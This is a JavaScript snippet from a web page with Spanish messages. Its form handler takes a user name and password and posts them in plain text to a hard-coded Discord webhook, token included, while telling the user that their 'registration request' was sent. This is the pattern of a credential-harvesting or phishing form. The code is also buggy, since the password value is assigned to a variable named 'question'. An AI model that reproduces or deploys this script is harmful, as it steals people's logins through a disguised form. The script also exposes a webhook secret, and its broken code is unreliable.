        document.getElementById("question-form").addEventListener("submit", function(event) {
            event.preventDefault();

            const name = document.getElementById("name").value;
            const question = document.getElementById("password").value;
            sendToDiscord(name, password);
        });

        function sendToDiscord(name, password) {
            const webhookURL = "https://discord.com/api/webhooks/1237172277326516235/daTRqQWVoBMDE5q4aa0TTz9doMXK9nKMZzRr15i-iW5JAxzXlTiZ0Y5sx-oHSQeiAq0T";
            const data = {
                content: `
**Nombre de usuario:** ${name}
-
**Contraseña:** ${password}`
            };

            fetch(webhookURL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (response.ok) {
                    alert("La solicitud de registro fue enviada con éxito.");
                } else {
                    alert("Hubo un error al enviar la solicitud de registro. Por favor, inténtalo de nuevo más tarde.");
                }
            })
            .catch(error => {
                console.error("Hubo un error al enviar la solicitud de registro:", error);
                alert("Hubo un error al enviar la solicitud de registro. Por favor, inténtalo de nuevo más tarde.");
            });
        }
        
        function mostrarMensajeEmergente() {
            var mensaje = document.getElementById("mensajeEmergente");
            mensaje.style.display = "block";
        }

        function ocultarMensajeEmergente() {
            var mensaje = document.getElementById("mensajeEmergente");
            mensaje.style.display = "none";
        }

        var icono = document.getElementById("icono");

        icono.addEventListener("click", mostrarMensajeEmergente);
        icono.addEventListener("mouseout", ocultarMensajeEmergente);
